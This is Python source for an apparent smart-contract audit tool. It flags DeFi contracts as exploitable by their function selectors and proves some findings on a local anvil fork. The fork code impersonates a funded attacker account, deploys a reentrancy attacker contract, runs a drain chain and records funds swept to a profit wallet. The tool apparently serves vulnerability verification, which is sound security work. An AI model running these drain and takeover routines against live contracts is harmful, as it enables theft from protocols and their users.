"""Attack simulator — fork-based simulation"""
import subprocess
from typing import Dict, List, Optional

from defihunter.core import abi as abi_util

def run(cmd: str, timeout: int = 60) -> str:
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
    return result.stdout.strip()

class AttackSimulator:
    def __init__(self, rpc_url: Optional[str] = None, block: Optional[int] = None):
        self.rpc_url = rpc_url or 'http://localhost:8545'
        self.block = block
    
    def run(self, attack_type: str, target: str) -> Dict:
        """Run attack simulation"""
        if attack_type == 'inflation':
            return self._simulate_inflation(target)
        elif attack_type == 'admin':
            return self._simulate_admin(target)
        elif attack_type == 'governance':
            return self._simulate_governance(target)
        elif attack_type == 'oracle':
            return self._simulate_oracle(target)
        elif attack_type == 'reentrancy':
            return self._simulate_reentrancy(target)
        elif attack_type == 'bridge':
            return self._simulate_bridge(target)
        elif attack_type == 'sandwich':
            return self._simulate_sandwich(target)
        elif attack_type == 'twap':
            return self._simulate_twap(target)
        elif attack_type == 'flashloan':
            return self._simulate_flashloan(target)
        elif attack_type == 'withdraw':
            return self._simulate_withdraw(target)
        elif attack_type == 'initialize':
            return self._simulate_initialize(target)
        elif attack_type == 'permit':
            return self._simulate_permit(target)
        elif attack_type == 'liquidation':
            return self._simulate_liquidation(target)
        elif attack_type == 'forcesend':
            return self._simulate_forcesend(target)
        elif attack_type == 'peg':
            return self._simulate_peg(target)
        elif attack_type == 'crossfunc':
            return self._simulate_crossfunc(target)
        elif attack_type == 'delegatecall':
            return self._simulate_delegatecall(target)
        elif attack_type == 'mint':
            return self._simulate_mint(target)
        else:
            return {'success': False, 'error': f'Unknown attack type: {attack_type}'}
    
    def _simulate_inflation(self, target: str) -> Dict:
        """Simulate inflation attack"""
        steps = []
        
        # Read initial state
        ts = run(f'cast call {target} "totalSupply()(uint256)" --rpc-url {self.rpc_url} 2>/dev/null')
        steps.append({'step': 'Initial totalSupply', 'value': ts})
        
        # Check if deposit function exists
        code = run(f'cast code {target} --rpc-url {self.rpc_url} 2>/dev/null')
        has_deposit = '6e553f65' in code or 'b6b55f25' in code
        
        if has_deposit:
            steps.append({'step': 'Deposit function found', 'value': 'vulnerable'})
            return {
                'success': True,
                'steps': steps,
                'profit': 'Variable (depends on victim deposit)',
                'description': 'First depositor can inflate share price via donation',
            }
        else:
            return {
                'success': False,
                'steps': steps,
                'error': 'No standard deposit function found',
            }
    
    def _simulate_admin(self, target: str) -> Dict:
        """Simulate admin key compromise"""
        code = run(f'cast code {target} --rpc-url {self.rpc_url} 2>/dev/null')
        
        has_admin = any(s in code for s in ['bf353dbb', '65fae35e', '9c52a7f1'])
        has_file = '4c929902' in code
        has_drip = 'd370ff70' in code
        
        if has_admin:
            return {
                'success': True,
                'steps': [
                    {'step': 'Admin function found', 'value': 'wards/rely/deny'},
                    {'step': 'File function found', 'value': str(has_file)},
                    {'step': 'Drip function found', 'value': str(has_drip)},
                ],
                'profit': 'All funds in contract',
                'description': 'Admin can drain all value via file() + drip()',
            }
        return {'success': False, 'error': 'No admin functions detected'}
    
    def _simulate_governance(self, target: str) -> Dict:
        """Simulate flash loan governance attack"""
        code = run(f'cast code {target} --rpc-url {self.rpc_url} 2>/dev/null')
        
        has_votes = any(s in code for s in ['getVotes', 'getPriorVotes', 'delegates'])
        
        if has_votes:
            return {
                'success': True,
                'description': 'Token has voting — check for snapshot protection',
            }
        return {'success': False, 'error': 'No voting functions detected'}
    
    def _simulate_oracle(self, target: str) -> Dict:
        """Simulate oracle manipulation"""
        code = run(f'cast code {target} --rpc-url {self.rpc_url} 2>/dev/null')
        # Chainlink-style getPrice / getAssetPrice selector-ish markers
        has_price = any(s in code for s in ['50d25bcd', 'b1c5e427', '4b43f4a4'])  # latestAnswer / getPrice / update
        if has_price:
            return {
                'success': True,
                'steps': [
                    {'step': 'Price oracle functions found', 'value': 'queryable'},
                    {'step': 'Check data source', 'value': 'DEX spot or TWAP?'},
                ],
                'profit': 'Depends on depth of DEX liquidity',
                'description': 'If oracle reads DEX spot price, a flash-loan swap can manipulate it',
            }
        return {'success': False, 'error': 'No price oracle functions detected'}

    def _simulate_reentrancy(self, target: str) -> Dict:
        """Simulate reentrancy attack"""
        code = run(f'cast code {target} --rpc-url {self.rpc_url} 2>/dev/null')
        # Check for common reentrancy hooks: ERC777 tokensReceived, onFlashLoan, withdraw
        has_hooks = any(s in code for s in ['e3a4da69', '5cffe9de', '3ccfd60b'])  # tokensReceived / flashLoan / withdraw
        if has_hooks:
            return {
                'success': True,
                'steps': [
                    {'step': 'External callbacks found', 'value': 'tokensReceived/onFlashLoan'},
                    {'step': 'Check for ReentrancyGuard', 'value': 'missing? (simulate)'},
                ],
                'profit': 'All funds in pool',
                'description': 'External callback before state update allows recursive drain',
            }
        return {'success': False, 'error': 'No reentrancy hooks detected'}

    def _simulate_bridge(self, target: str) -> Dict:
        """Simulate bridge deposit spoof"""
        code = run(f'cast code {target} --rpc-url {self.rpc_url} 2>/dev/null')
        # mint selector + finalize/flush selectors
        has_mint = 'a0712d68' in code
        has_finalize = any(s in code for s in ['20dd9f18', '0ecbd0b7', '0b37eb8b'])  # finalizeDeposit variants
        if has_mint or has_finalize:
            return {
                'success': True,
                'steps': [
                    {'step': 'Mint function found', 'value': str(has_mint)},
                    {'step': 'Finalize/deposit function found', 'value': str(has_finalize)},
                    {'step': 'Check proof verification', 'value': 'signatures/oracle required?'},
                ],
                'profit': 'Unbounded (all bridge collateral)',
                'description': 'Bridge mint without proper proof verification lets attacker fabricate deposits',
            }
        return {'success': False, 'error': 'No bridge mint/finalize functions detected'}

    def _simulate_sandwich(self, target: str) -> Dict:
        """Simulate MEV sandwich — informational, needs mempool"""
        code = run(f'cast code {target} --rpc-url {self.rpc_url} 2>/dev/null')
        has_swap = '022c0d9f' in code  # swap(uint256,uint256,address,bytes)
        if has_swap:
            return {
                'success': True,
                'steps': [
                    {'step': 'AMM pair found (swap selector)', 'value': 'sandwichable'},
                    {'step': 'Requires mempool access', 'value': 'flashbots/private mempool'},
                ],
                'profit': 'Slippage captured from victim',
                'description': 'Front-run + back-run around victim swap to extract value',
            }
        return {'success': False, 'error': 'No AMM swap function detected'}

    def _simulate_twap(self, target: str) -> Dict:
        """Simulate TWAP oracle manipulation"""
        code = run(f'cast code {target} --rpc-url {self.rpc_url} 2>/dev/null')
        # UniswapV2 pair TWAP: observe / consult / price0CumulativeLast
        has_twap = any(s in code for s in ['883bdbfd', 'c22cee0b', '5e76e5d4'])  # observe / consult / price0CumulativeLast
        if has_twap:
            return {
                'success': True,
                'steps': [
                    {'step': 'TWAP functions found', 'value': 'check window length'},
                    {'step': 'Short window?', 'value': 'manipulable via flash loan'},
                ],
                'profit': 'Depends on protocol trusting TWAP',
                'description': 'TWAP with short observation window can be moved with a flash loan',
            }
        return {'success': False, 'error': 'No TWAP functions detected'}

    def _simulate_flashloan(self, target: str) -> Dict:
        """Simulate flash loan reentrancy combo"""
        code = run(f'cast code {target} --rpc-url {self.rpc_url} 2>/dev/null')
        has_flash = '5cffe9de' in code  # flashLoan(address,address,uint256,bytes)
        if has_flash:
            return {
                'success': True,
                'steps': [
                    {'step': 'FlashLoan function found', 'value': 'capital source available'},
                    {'step': 'Chain with reentrancy', 'value': 'see reentrancy_attack'},
                ],
                'profit': 'All funds in pool',
                'description': 'Flash loan funds the reentrancy drain with zero upfront capital',
            }
        return {'success': False, 'error': 'No flashLoan function detected'}

    def _simulate_withdraw(self, target: str) -> Dict:
        """Simulate withdraw front-run / share price manipulation"""
        code = run(f'cast code {target} --rpc-url {self.rpc_url} 2>/dev/null')
        # ERC-4626: convertToAssets / previewRedeem / redeem
        has_4626 = any(s in code for s in ['07a2d13a', '4cdad506', 'ba087652', 'd905777e'])
        if has_4626:
            return {
                'success': True,
                'steps': [
                    {'step': 'ERC-4626 functions found', 'value': 'convertToAssets/redeem'},
                    {'step': 'Rounding direction exploitable?', 'value': 'simulate with 1 wei units'},
                ],
                'profit': 'Small per victim; scales with volume',
                'description': 'Share price rounding / moves can be front-run to victimize large withdraws',
            }
        return {'success': False, 'error': 'No ERC-4626 functions detected'}

    def _simulate_initialize(self, target: str) -> Dict:
        """Simulate unguarded initializer on upgradeable proxy"""
        # Check EIP-1967 implementation slot
        impl = run(f'cast storage {target} 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc --rpc-url {self.rpc_url} 2>/dev/null')
        code = run(f'cast code {target} --rpc-url {self.rpc_url} 2>/dev/null')
        has_init = '1cf5d2a8' in code or 'fe4b84df' in code  # initialize() / initialize(address)
        if impl and impl != '0x' and has_init:
            return {
                'success': True,
                'steps': [
                    {'step': 'EIP-1967 proxy detected', 'value': impl[:42]},
                    {'step': 'initialize() present', 'value': 'check if already initialized'},
                ],
                'profit': 'Full contract takeover',
                'description': 'Unguarded initialize() on a proxy allows first-caller ownership takeover',
            }
        return {'success': False, 'error': 'Not an upgradeable proxy with initialize(), or already initialized'}

    def _simulate_permit(self, target: str) -> Dict:
        """Simulate cross-chain permit replay"""
        code = run(f'cast code {target} --rpc-url {self.rpc_url} 2>/dev/null')
        has_permit = 'd505accf' in code  # permit(owner,spender,value,deadline,v,r,s)
        if has_permit:
            return {
                'success': True,
                'steps': [
                    {'step': 'EIP-2612 permit found', 'value': 'check domain separator'},
                    {'step': 'ChainId in domain?', 'value': 'if missing -> cross-chain replay'},
                ],
                'profit': 'Victim allowance on multiple chains',
                'description': 'Permit signatures replayable across chains if domain separator omits chainId',
            }
        return {'success': False, 'error': 'No permit function detected'}

    def _simulate_liquidation(self, target: str) -> Dict:
        """Simulate liquidation race"""
        code = run(f'cast code {target} --rpc-url {self.rpc_url} 2>/dev/null')
        has_liq = '69ab90df' in code  # liquidate(address,uint256,address,address)
        if has_liq:
            return {
                'success': True,
                'steps': [
                    {'step': 'liquidate() found', 'value': 'liquidation bonus claimable'},
                    {'step': 'Health monitoring required', 'value': 'front-run on health drop'},
                ],
                'profit': 'Liquidation bonus per position',
                'description': 'Race/front-run liquidations to capture the bonus before others',
            }
        return {'success': False, 'error': 'No liquidate function detected'}

    def _simulate_forcesend(self, target: str) -> Dict:
        """Simulate forced ETH send breaking accounting"""
        code = run(f'cast code {target} --rpc-url {self.rpc_url} 2>/dev/null')
        # Does the vault use balanceOf(address(this))? Heuristic: ERC-4626 totalAssets
        has_assets = '01e1d114' in code  # totalAssets()
        if has_assets:
            return {
                'success': True,
                'steps': [
                    {'step': 'totalAssets() found', 'value': 'check internal vs balanceOf'},
                    {'step': 'selfdestruct force-send', 'value': 'inflates share price'},
                ],
                'profit': 'Share price inflation',
                'description': 'Force-sent ETH (selfdestruct/coinbase) inflates balance-based share price',
            }
        return {'success': False, 'error': 'No totalAssets() function detected'}

    def _simulate_peg(self, target: str) -> Dict:
        """Simulate stablecoin collateral swap attack"""
        code = run(f'cast code {target} --rpc-url {self.rpc_url} 2>/dev/null')
        has_vault = '5b6fc7a8' in code  # openVault()
        has_swap = any(s in code for s in ['76cc7a9a', '0f7ee467'])  # swapCollateral variants
        if has_vault and has_swap:
            return {
                'success': True,
                'steps': [
                    {'step': 'Vault open + collateral swap found', 'value': 'check price source'},
                    {'step': 'Combine with twap/oracle attack', 'value': 'mint > backing'},
                ],
                'profit': 'Minted stablecoin minus collateral cost',
                'description': 'Collateral swap at distorted price lets attacker mint unbacked stablecoin',
            }
        return {'success': False, 'error': 'No collateral swap / vault functions detected'}

    def _simulate_crossfunc(self, target: str) -> Dict:
        """Simulate cross-function reentrancy (withdraw sends before state update)"""
        code = run(f'cast code {target} --rpc-url {self.rpc_url} 2>/dev/null')
        has_withdraw_balance = '5fd8c710' in code  # withdrawBalance()
        has_transfer = '56a6d9ef' in code  # transferBalance(address,uint256)
        if has_withdraw_balance and has_transfer:
            return {
                'success': True,
                'steps': [
                    {'step': 'withdrawBalance() sends before zeroing', 'value': 'reentrant receive() hook'},
                    {'step': 're-enter transferBalance()', 'value': 'double-credit funds to second account'},
                ],
                'profit': 'Withdrawal + transferred balance (value from thin air)',
                'description': 'Cross-function reentrancy: state updated after the external call in one function, other function unprotected',
            }
        return {'success': False, 'error': 'No cross-function reentrancy surface detected'}

    def _simulate_delegatecall(self, target: str) -> Dict:
        """Simulate arbitrary delegatecall via unauthenticated proxy upgrade"""
        code = run(f'cast code {target} --rpc-url {self.rpc_url} 2>/dev/null')
        has_set_impl = 'd784d426' in code  # setImplementation(address)
        if has_set_impl:
            return {
                'success': True,
                'steps': [
                    {'step': 'setImplementation(address) found', 'value': 'check access control'},
                    {'step': 'Point proxy at attacker contract', 'value': 'delegatecall runs in proxy context'},
                    {'step': 'Steal proxy ETH / overwrite storage', 'value': 'layout collision or balance sweep'},
                ],
                'profit': 'Full proxy ETH balance + storage takeover',
                'description': 'Unauthenticated proxy upgrade allows arbitrary delegatecall',
            }
        return {'success': False, 'error': 'No setImplementation / proxy upgrade path detected'}

    def _simulate_mint(self, target: str) -> Dict:
        """Simulate permissionless mint (missing access control)"""
        code = run(f'cast code {target} --rpc-url {self.rpc_url} 2>/dev/null')
        has_mint = '40c10f19' in code  # mint(address,uint256)
        if has_mint:
            return {
                'success': True,
                'steps': [
                    {'step': 'public mint(address,uint256) found', 'value': 'call it directly'},
                    {'step': 'Mint unlimited supply to attacker', 'value': 'dilute holders'},
                    {'step': 'Dump minted tokens', 'value': 'swap for real assets'},
                ],
                'profit': 'Unlimited token supply minted for free',
                'description': 'Token mint() lacks onlyOwner/minter role check',
            }
        return {'success': False, 'error': 'No public mint(address,uint256) detected'}

# ---------------------------------------------------------------------------
# ForkSimulator — REAL fork verification (anvil + cast).
# Static analysis says "possible"; an eth_call from an arbitrary attacker
# account on a mainnet fork says "provable". Degrades gracefully when the
# foundry binaries or an RPC URL are unavailable — the wizard keeps running.
# ---------------------------------------------------------------------------

class ForkSimulator:
    """Context manager: boot an anvil fork, prove callable-by-anyone
    findings with real eth_call, tear the fork down on exit.

    Usage:
        with ForkSimulator(rpc_url="https://eth-mainnet...") as fork:
            if not fork.available:
                print(fork.why_not)
            fork.run("mint", "0x1234...")
    """

    def __init__(self, rpc_url: Optional[str] = None, block: Optional[int] = None,
                 port: Optional[int] = None, attacker: Optional[str] = None,
                 profit_wallet: Optional[str] = None):
        self.rpc_url = rpc_url
        self.block = block
        self.port = port or self._free_port()
        self.proc = None
        self.available = False
        self.why_not = ""
        # anvil dev account #2: always unlocked + funded on any anvil fork, and
        # from the protocol's perspective it is just an arbitrary EOA.
        # Both are user-overridable: --attacker is the EOA that SIGNS the
        # proof txs, --profit-wallet is where the attacker-contract drain
        # lands (defaults to the attacker EOA).
        self.attacker = attacker or "0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC"
        self.profit_wallet = profit_wallet or self.attacker
        # real ABI for the target (when known) — see run(abi=...)
        self._abi: List[Dict] = []
        self._attack_candidates: List[tuple] = []

    # Function names that carry each attack route. The ABI tells us the REAL
    # signature with the REAL input types — no more selector guessing.
    ATTACK_FN_NAMES = {
        "mint": ["mint", "mintTo", "mintToken"],
        "initialize": ["initialize", "init"],
        "delegatecall": ["upgradeTo", "upgrade", "setImplementation",
                         "setTarget", "changeImplementation",
                         "updateImplementation", "setLogic"],
        "reentrancy": ["withdraw", "withdrawTo", "claim", "redeem", "unstake",
                       "harvest", "withdrawAll", "emergencyWithdraw"],
        "arbitrarycall": ["execute", "call", "exec", "performAction",
                          "governanceCall", "forward", "execute3"],
        "approve": ["approve", "setApprovalForAll", "increaseAllowance"],
        "selfdestruct": ["selfdestruct", "kill", "destroy", "die",
                         "killMe", "close"],
    }
    MAX_UINT = ("11579208923731619542357098500868790785326998466564056403"
                "9457584007913129639935")

    def _abi_candidates(self, attack: str) -> List[tuple]:
        """(signature, args) pairs for functions in the REAL ABI that map to
        this attack route. Empty when the ABI is unknown or has no match —
        callers fall back to the hardcoded guess battery."""
        out = []
        for fn in abi_util.functions(self._abi):
            name = fn.get("name", "")
            if name not in self.ATTACK_FN_NAMES.get(attack, ()):
                continue
            args = []
            for inp in fn.get("inputs", []):
                t = inp.get("type", "")
                if t == "address":
                    args.append(self.attacker)
                elif t.startswith("uint"):
                    if attack == "approve":
                        args.append(self.MAX_UINT)
                    elif attack == "reentrancy":
                        args.append("1")  # 1 wei — avoids balance limits
                    else:
                        args.append("1000000")
                elif t == "bool":
                    args.append("true")
                elif t == "bytes":
                    args.append("0x" + "00" * 4)
                elif t == "string":
                    args.append("")
                else:
                    args.append("0")
            out.append((abi_util.canonical(fn), args))
        return out

    def _merge_candidates(self, hardcoded: List[tuple]) -> List[tuple]:
        """ABI-derived candidates first; hardcoded guesses only when the ABI
        did not already give us that exact signature."""
        abi_sigs = {sig for sig, _ in self._attack_candidates}
        return (self._attack_candidates
                + [c for c in hardcoded if c[0] not in abi_sigs])

    @staticmethod
    def _free_port() -> int:
        import socket
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind(("127.0.0.1", 0))
            return s.getsockname()[1]

    def _has_tool(self, name: str) -> bool:
        import shutil
        return shutil.which(name) is not None

    def __enter__(self) -> "ForkSimulator":
        if not self._has_tool("anvil") or not self._has_tool("cast"):
            self.why_not = ("Fork verification skipped: foundry binaries "
                            "(anvil/cast) not found on PATH.")
            return self
        import subprocess as sp
        cmd = ["anvil", "--port", str(self.port), "--silent"]
        if self.rpc_url and "http" in self.rpc_url:
            cmd += ["--fork-url", self.rpc_url]
            if self.block:
                cmd += ["--fork-block-number", str(self.block)]
        # rpc_url=None → blank anvil chain (offline self-test / drain demo
        # does not need a mainnet fork).
        try:
            self.proc = sp.Popen(cmd, stdout=sp.DEVNULL, stderr=sp.DEVNULL)
        except OSError as e:
            self.why_not = f"Fork verification skipped: could not start anvil ({e})."
            return self
        if self._wait_ready(40):
            self.available = True
        else:
            self.why_not = "Fork verification skipped: anvil fork did not become ready."
            self.__exit__(None, None, None)
        return self

    def _wait_ready(self, timeout: int = 40) -> bool:
        import time
        deadline = time.time() + timeout
        while time.time() < deadline:
            try:
                out = subprocess.run(
                    ["cast", "block-number", "--rpc-url", self.rpc_url_local],
                    capture_output=True, text=True, timeout=5,
                )
                if out.returncode == 0 and out.stdout.strip().isdigit():
                    return True
            except Exception:
                pass
            time.sleep(1)
        return False

    @property
    def rpc_url_local(self) -> str:
        return f"http://127.0.0.1:{self.port}"

    def _call(self, selector: str, args: List[str], extra_from: bool = True) -> Dict:
        cmd = ["cast", "call", self._target, selector, *args,
               "--rpc-url", self.rpc_url_local]
        if extra_from:
            cmd += ["--from", self.attacker]
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        return {"ok": proc.returncode == 0, "stdout": proc.stdout.strip(),
                "stderr": proc.stderr.strip()}

    def _read(self, selector: str) -> str:
        """Read a state variable (no from-address needed for view reads)."""
        proc = subprocess.run(
            ["cast", "call", self._target, selector, "--rpc-url", self.rpc_url_local],
            capture_output=True, text=True, timeout=30)
        return proc.stdout.strip() or proc.stderr.strip()

    def _fund_attacker(self) -> bool:
        """Give the attacker 2 ETH on the fork so real sends can pay gas.

        A user-supplied --attacker is not an anvil dev account, so it must be
        impersonated first (anvil_impersonateAccount) for --unlocked sends to
        work. Dev accounts impersonate fine too (no-op).
        """
        imp = subprocess.run(
            ["cast", "rpc", "anvil_impersonateAccount", self.attacker,
             "--rpc-url", self.rpc_url_local],
            capture_output=True, text=True, timeout=30)
        if imp.returncode != 0:
            return False
        proc = subprocess.run(
            ["cast", "rpc", "anvil_setBalance", self.attacker,
             "0x1BC16D674EC80000", "--rpc-url", self.rpc_url_local],  # 2 ETH
            capture_output=True, text=True, timeout=30)
        # anvil_setBalance returns JSON 'null' on success — exit code is the truth.
        return proc.returncode == 0

    def _has_code(self, addr: Optional[str] = None) -> bool:
        """True when a target has bytecode on this fork.

        Calling initialize()/mint() on an EOA or a devnet-only address that
        does not exist on mainnet MINES VACUOUSLY (plain value transfer) —
        without this check a phantom address would be reported EXPLOITABLE.
        """
        addr = addr or getattr(self, "_target", "") or ""
        proc = subprocess.run(
            ["cast", "code", addr, "--rpc-url", self.rpc_url_local],
            capture_output=True, text=True, timeout=30)
        out = proc.stdout.strip().lower()
        return bool(out and out not in ("0x", "0x0"))

    def _balance(self, addr: str) -> str:
        """Raw wei ETH balance of an address on the fork (eth_getBalance).

        Missing cast (foundry not installed) must fail CLOSED: return "" so
        _to_int → None → callers treat the read as unavailable instead of
        crashing with FileNotFoundError mid-battery.
        """
        try:
            proc = subprocess.run(
                ["cast", "balance", addr, "--rpc-url", self.rpc_url_local],
                capture_output=True, text=True, timeout=30)
        except FileNotFoundError:
            return ""
        return proc.stdout.strip() or proc.stderr.strip()

    @staticmethod
    def _to_int(value) -> Optional[int]:
        """Parse a wei/uint value from cast output.

        `cast balance` prints DECIMAL wei; `cast call` prints HEX. A read
        failure (empty/error string) must NOT be treated as zero — return
        None so the caller fails closed instead of proving a false change.
        """
        try:
            s = str(value or "").strip() or "0"
            if s.lower().startswith("0x"):
                return int(s, 16)
            return int(s)
        except (ValueError, TypeError):
            return None

    def _send(self, selector: str, args: List[str]) -> Dict:
        """A REAL state-changing tx from the attacker account (fork-local).

        ok=True only when the tx MINED WITH STATUS 1 — cast send 1.7.x
        returns rc=0 even when a tx reverts on-chain, so we cross-check the
        receipt. A reverted-but-mined tx must NOT count as proven.
        """
        if not self._fund_attacker():
            return {"ok": False, "stdout": "", "stderr": "could not fund attacker"}
        cmd = ["cast", "send", "--unlocked", self._target, selector, *args,
               "--from", self.attacker, "--rpc-url", self.rpc_url_local]
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        txhash = ""
        if proc.returncode == 0:
            for line in proc.stdout.splitlines():
                if line.lower().startswith("transactionhash"):
                    txhash = line.split()[1].strip()
                    break
        mined = proc.returncode == 0 and (not txhash or self._mined(txhash))
        return {"ok": mined, "stdout": proc.stdout.strip(),
                "stderr": proc.stderr.strip(), "txhash": txhash}

    def _send_to(self, addr: str, selector: str, args: List[str],
                 value: Optional[str] = None,
                 gas_limit: Optional[str] = None) -> Dict:
        """State-changing tx to an ARBITRARY contract (not just the target)."""
        if not self._fund_attacker():
            return {"ok": False, "stdout": "", "stderr": "could not fund attacker"}
        cmd = ["cast", "send", "--unlocked", addr, selector, *args,
               "--from", self.attacker, "--rpc-url", self.rpc_url_local]
        if value:
            cmd += ["--value", value]
        if gas_limit:
            cmd += ["--gas-limit", gas_limit]
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=90)
        txhash = ""
        if proc.returncode == 0:
            for line in proc.stdout.splitlines():
                if line.lower().startswith("transactionhash"):
                    txhash = line.split()[1].strip()
                    break
        return {"ok": proc.returncode == 0, "stdout": proc.stdout.strip(),
                "stderr": proc.stderr.strip(), "txhash": txhash}

    def _mined(self, txhash: str) -> bool:
        """True when a tx MINED with status 1 (cast send rc alone does not
        distinguish reverted-but-mined transactions)."""
        if not txhash:
            return False
        proc = subprocess.run(
            ["cast", "receipt", txhash, "status", "--rpc-url", self.rpc_url_local],
            capture_output=True, text=True, timeout=30)
        return "true" in proc.stdout.strip().lower()

    def _call_on(self, addr: str, selector: str, args: List[str]) -> Dict:
        """eth_call against an arbitrary contract (no state change)."""
        cmd = ["cast", "call", addr, selector, *args,
               "--rpc-url", self.rpc_url_local]
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        return {"ok": proc.returncode == 0, "stdout": proc.stdout.strip(),
                "stderr": proc.stderr.strip()}

    def _deploy(self, bytecode: str, constructor_types: Optional[List[str]] = None,
                constructor_args: Optional[List[str]] = None) -> Dict:
        """Deploy bytecode on the fork from the attacker EOA.

        Returns {'ok', 'address', 'stderr'}. Constructor args (if any) are
        passed as a "constructor(...)" signature + args — cast appends the
        ABI encoding itself (manually appending to the initcode makes the
        CREATE revert with empty data).
        """
        if not self._fund_attacker():
            return {"ok": False, "address": "", "stderr": "could not fund attacker"}
        cmd = ["cast", "send", "--unlocked", "--from", self.attacker,
               "--rpc-url", self.rpc_url_local, "--json",
               "--create", "0x" + bytecode]
        if constructor_types and constructor_args:
            cmd += [f"constructor({','.join(constructor_types)})",
                    *constructor_args]
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=90)
        if proc.returncode != 0:
            return {"ok": False, "address": "", "stderr": proc.stderr.strip()[:300]}
        try:
            import json
            data = json.loads(proc.stdout)
            addr = (data.get("contractAddress")
                    or (data.get("receipt") or {}).get("contractAddress")
                    or "")
            return {"ok": bool(addr), "address": addr,
                    "stderr": "" if addr else proc.stdout[:200]}
        except Exception:
            return {"ok": False, "address": "", "stderr": proc.stdout[:200]}

    def _abi_encode(self, types: List[str], args: List[str]) -> str:
        proc = subprocess.run(
            ["cast", "abi-encode", f"encode({','.join(types)})", *args],
            capture_output=True, text=True, timeout=30)
        return proc.stdout.strip() if proc.returncode == 0 else ""

    def _sig_selector(self, sig: str) -> str:
        proc = subprocess.run(["cast", "sig", sig],
                              capture_output=True, text=True, timeout=30)
        return proc.stdout.strip() if proc.returncode == 0 else ""

    def prove_reentrancy(self, target: str, payout_sig: str = "withdraw(uint256)",
                         amount: str = "1", demo: bool = False,
                         profit_wallet: Optional[str] = None) -> Dict:
        """One-block exploit chain: deploy a ReentrancyAttacker whose fallback
        re-enters the victim's payout, seed a deposit, fire the chain, and
        read the state diff (reentries + victim ETH before → after).

        CONFIRMED — the drain chain actually executed: reentries > 1 and the
                    victim's ETH balance decreased.
        UNVERIFIED — compiler missing / deploy failed / chain reverted: the
                    window may still exist but we could NOT demonstrate a drain.
        """
        if not self.available:
            return {"success": False, "verdict": "UNVERIFIED",
                    "error": self.why_not, "attack": "reentrancy",
                    "target": target}
        from defihunter.core import attacker
        art = attacker.get_contract("ReentrancyAttacker")
        if not art.get("bytecode"):
            return {"success": False, "verdict": "UNVERIFIED",
                    "error": "attacker contract compile unavailable (solc not found)",
                    "attack": "reentrancy", "target": target}
        if not self._has_code(target):
            return {"success": False, "verdict": "REFUTED",
                    "evidence": "target has no bytecode on this fork",
                    "attack": "reentrancy", "target": target}

        # payload = selector + encoded args of the payout call
        sel = self._sig_selector(payout_sig)
        sig_parts = payout_sig.split("(")[1].rstrip(")") if "(" in payout_sig else ""
        arg_types = [t.strip() for t in sig_parts.split(",") if t.strip()]
        arg_enc = self._abi_encode(arg_types, [amount]) if arg_types else ""
        payload = ""
        if sel and (not arg_types or arg_enc):
            payload = sel + (arg_enc[2:] if arg_enc.startswith("0x") else arg_enc)
        if not payload:
            return {"success": False, "verdict": "UNVERIFIED",
                    "error": f"could not encode payload for {payout_sig}",
                    "attack": "reentrancy", "target": target}

        owner = profit_wallet or self.profit_wallet
        dep = self._deploy(art["bytecode"],
                           ["address", "address", "bytes"],
                           [target, owner, payload])
        if not dep.get("ok"):
            return {"success": False, "verdict": "UNVERIFIED",
                    "error": f"attacker deploy failed: {dep.get('stderr', '')[:120]}",
                    "attack": "reentrancy", "target": target}
        attacker_addr = dep["address"]

        # attacker deposits 1 ETH into the victim (victim records
        # balances[attacker_contract] = 1 ETH)
        seed = self._send_to(attacker_addr, "depositIntoVictim()", [],
                             value="1ether")
        if not seed["ok"]:
            return {"success": False, "verdict": "UNVERIFIED",
                    "error": f"could not seed deposit: {seed['stderr'][:120]}",
                    "attack": "reentrancy", "target": target}
        # baseline AFTER seeding — the drain must move ETH out of the victim
        seeded = self._balance(target)

        # fire the drain chain with a generous gas limit (each re-entry costs
        # ~10k gas; default estimate may be too low to show the loop)
        chain = self._send_to(attacker_addr, "go()", [], gas_limit="30000000")
        chain_mined = chain["ok"] and self._mined(chain.get("txhash", ""))
        reentries = self._call_on(attacker_addr, "reentries()", [])
        after = self._balance(target)

        steps = [
            {"step": "deployed ReentrancyAttacker", "value": attacker_addr},
            {"step": "attacker deposited 1 ETH into victim", "value": "seeded"},
            {"step": "go() drain chain",
             "value": "mined, status 1 ✅" if chain_mined
             else (f"reverted: {chain.get('stderr','')[:100]}"
                   if chain["ok"] else f"failed: {chain['stderr'][:100]}")},
            {"step": "reentries()", "value": reentries["stdout"] or "read failed"},
            {"step": "victim ETH after seed → after drain",
             "value": f"{seeded} → {after}"},
        ]
        drained = False
        try:
            n = int(reentries["stdout"] or "0", 16)          # cast call → hex
            drained = chain_mined and n > 1 and int(after, 10) < int(seeded, 10)  # cast balance → decimal
        except Exception:
            drained = False

        if drained:
            n = int(reentries["stdout"] or "0", 16)
            return {"success": True, "verdict": "CONFIRMED", "attack": "reentrancy",
                    "target": target,
                    "profit": (f"{n} re-entrant withdrawals from "
                               "a single deposit in one block"),
                    "steps": steps,
                    "evidence": (f"ReentrancyAttacker re-entered {n}×; "
                                 f"victim ETH {seeded} → {after}; "
                                 f"drain swept to profit wallet {owner}"),
                    "attacker_address": attacker_addr,
                    "profit_wallet": owner}
        return {"success": False, "verdict": "UNVERIFIED",
                "error": (f"drain chain did not demonstrate reentrancy: "
                          f"{'go() reverted' if not chain['ok'] else 'no re-entry / no balance drop'}"),
                "attack": "reentrancy", "target": target,
                "steps": steps, "attacker_address": attacker_addr}

    def run(self, attack: str, target: str, source_finding: Optional[Dict] = None,
            abi: Optional[List[Dict]] = None) -> Dict:
        """Prove the finding on a real anvil fork, using the contract's REAL
        ABI when provided (real signatures, real input types — no guessing).

        Returns a result dict with a `verdict`:
          CONFIRMED   — a tx from an arbitrary account mined AND the
                        evidence shows a REAL state change (ETH moved,
                        balanceOf changed, owner switched to the attacker,
                        allowance granted). A mined tx that moved no state
                        (e.g. empty withdraw() landing in a payable
                        fallback that does nothing — WETH) is REFUTED,
                        not CONFIRMED.
          REFUTED     — the ABI says the function exists but every call
                        reverted (or the target has no code, or every
                        mined call was a state-less no-op) → NOT callable
          UNVERIFIED  — could not prove either way (no ABI, no matching
                        function, or the fork never came up)
        """
